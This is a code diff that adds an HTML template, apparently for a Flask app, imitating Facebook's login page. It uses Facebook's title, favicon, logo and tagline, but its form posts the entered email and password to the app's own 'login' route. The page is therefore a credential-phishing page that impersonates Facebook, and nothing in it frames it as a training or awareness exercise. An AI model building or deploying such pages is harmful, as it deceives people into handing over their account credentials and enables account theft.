@@ -1,0 +1,30 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook - log in or sign up</title>
+    <link rel="icon" href=
+    "https://www.facebook.com/images/fb_icon_325x325.png">
+    <link rel="stylesheet" href="../static/i.css" />
+  </head>
+  <body>
+    <div class="content">
+      <div class="flex-div">
+        <div class="name-content">
+          <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" style="width:321px;height:106px;">
+          <!-- <h1 class="logo">Facebook</h1> -->
+          <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <form method="post" action="{{ url_for('login') }}">
+          <input name="email" type="text" placeholder="Email or Phone Number" required />
+            <input name="password" type="password" placeholder="Password" required>
+            <button class="login">Log In</button>
+            <a href="#">Forgot Password ?</a>
+            <hr>
+            <button class="create-account">Create New Account</button>
+          </form>
+      </div>
+    </div>
+  </body>
+</html>
